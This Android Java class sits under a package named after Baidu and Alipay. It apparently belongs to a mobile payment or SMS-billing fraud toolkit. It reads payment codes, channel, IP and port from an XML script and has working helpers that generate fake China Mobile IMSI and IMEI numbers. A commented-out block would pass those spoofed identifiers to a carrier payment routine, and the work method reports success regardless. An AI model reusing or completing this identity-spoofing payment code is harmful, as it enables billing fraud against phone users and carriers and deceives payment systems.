package com.baidu.alipay.script;

import java.util.List;
import java.util.Random;

//import com.taobao.alipay.mm318.Mm318Qd;

import android.content.Context;

public class Mmqd318 extends Tags{
	
//	private static final String TAG = "Mmqd318";
	
	private static final String APPID = "appId";
	private static final String PAYCODE = "payCode";
	private static final String CHANNEL = "channel";
	private static final String DATA = "data";
	private static final String IMSI = "imsi";
	private static final String IMEI = "imei";
	private static final String IP = "ip";
	private static final String PORT = "port";
	
	private String appId;
	private String imsi;
	private String imei;
	private String payCode;
	private String ip;
	private String port;
	private String channel;
	private String data;
	
	public Mmqd318(String xml,boolean dynamic){
		
		this.appId = getNodeValue(xml,APPID);
		this.payCode = getNodeValue(xml, PAYCODE);
		this.imsi = getNodeValue(xml, IMSI);
		this.imei = getNodeValue(xml,IMEI);
		this.ip = getNodeValue(xml, IP);
		this.port = getNodeValue(xml, PORT);
		this.channel = getNodeValue(xml, CHANNEL);
		this.data = getNodeValue(xml,DATA);
		
		this.dynamic = dynamic;
		
	}
	
	//46000 8288039859
	public static String getRandomImsi(){
		StringBuffer sb = new StringBuffer("4600");
		
		Random random = new Random();
		
		String arr[] = new String[]{"0","2","7"};
		
		sb.append(arr[random.nextInt(3)]);
		
		for(int i = 0; i < 10 ; i ++){
			sb.append(random.nextInt(10));
		}
		
		return sb.toString();
	}
	
	//86 7047026628738
	public static String getRandomImei(){
		StringBuffer sb = new StringBuffer("86");
		
		Random random = new Random();

		for(int i = 0 ; i < 13 ; i ++){
			sb.append(random.nextInt(10));
		}
		
		return sb.toString();
	}
	
	@Override
	public String work(final Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
//		try{
//			if(imsi == null || imsi.length() == 0){
//				imsi = getRandomImsi();
//			}
//			if(imei == null || imei.length() == 0){
//				imei = getRandomImei();
//			}
//			
//			
//			Mm318Qd mm318Qd = new Mm318Qd(context, ip, port, imsi, imei, appId, payCode, channel, data);
//	
//			mm318Qd.work();
//			
//		}catch (Exception e) {
//			e.printStackTrace();
//		}
		
		return TAGS_EXEC_SUCC;
	}

	@Override
	public String getTag() {
		return TAGS_MMQD318;
	}

}
